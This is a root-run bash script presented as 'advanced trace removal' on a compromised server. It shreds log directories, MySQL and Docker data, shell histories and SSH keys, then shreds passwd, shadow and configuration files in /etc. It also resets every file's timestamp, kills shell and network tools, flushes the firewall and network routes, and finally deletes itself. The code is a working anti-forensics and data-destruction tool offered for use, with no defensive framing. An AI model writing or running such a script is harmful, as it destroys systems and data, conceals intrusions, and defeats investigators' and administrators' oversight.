#!/bin/bash

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    echo "[!] This script must be run as ROOT."
    exit 1
fi

echo "[*] Starting advanced trace removal on the server..."

# -------------------------
# 1. Delete Advanced Logs
# -------------------------
echo "[*] Deleting advanced logs..."
log_dirs=(
  "/var/log"
  "/var/tmp"
  "/tmp"
  "/root/.bash_history"
  "/home/*/.bash_history"
  "/var/lib/mysql"
  "/var/lib/docker"
)

for dir in "${log_dirs[@]}"; do
  if [ -d "$dir" ]; then
    find "$dir" -type f -exec shred -u -z {} \;
    echo "[✔️] Deleted logs in: $dir"
  fi
done

# -------------------------
# 2. Clear Command and Process History
# -------------------------
echo "[*] Clearing command and process history..."
unset HISTFILE && history -c
shred -u -z ~/.bash_history /root/.bash_history

# -------------------------
# 3. Hide Suspicious Processes
# -------------------------
echo "[*] Hiding suspicious processes..."
processes=("python" "bash" "nc" "ssh" "perl" "ruby" "netcat" "wget" "curl")
for proc in "${processes[@]}"; do
  pkill -f "$proc" &> /dev/null
done

# -------------------------
# 4. Modify Timestamps
# -------------------------
echo "[*] Modifying timestamps for all files..."
find / -type f -exec touch -t 202201010101 {} \; 2>/dev/null

# -------------------------
# 5. Clean Firewall Settings
# -------------------------
echo "[*] Cleaning and resetting firewall settings..."
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
ufw disable &> /dev/null

# -------------------------
# 6. Remove Suspicious Users
# -------------------------
echo "[*] Removing suspicious users..."
users=("test" "admin" "hacker" "backdoor")
for user in "${users[@]}"; do
  deluser --remove-home "$user" &> /dev/null
done

# -------------------------
# 7. Remove SSH Keys and Credentials
# -------------------------
echo "[*] Removing SSH keys and credentials..."
find /root/.ssh /home/*/.ssh /etc/ssh/ -type f -exec shred -u -z {} \;

# -------------------------
# 8. Delete Sensitive System Files
# -------------------------
echo "[*] Deleting sensitive system files..."
find /etc -type f \( -name "*.conf" -o -name "*.log" -o -name "*.bak" -o -name "passwd" -o -name "shadow" \) -exec shred -u -z {} \;

# -------------------------
# 9. Clean Network Settings
# -------------------------
echo "[*] Cleaning network settings..."
ip addr flush dev eth0
ip route flush table main

# -------------------------
# 10. Hide the Script Itself
# -------------------------
echo "[*] Hiding the script itself..."
shred -u -z "$0"

echo "[✔️] All traces have been successfully wiped!"
exit 0
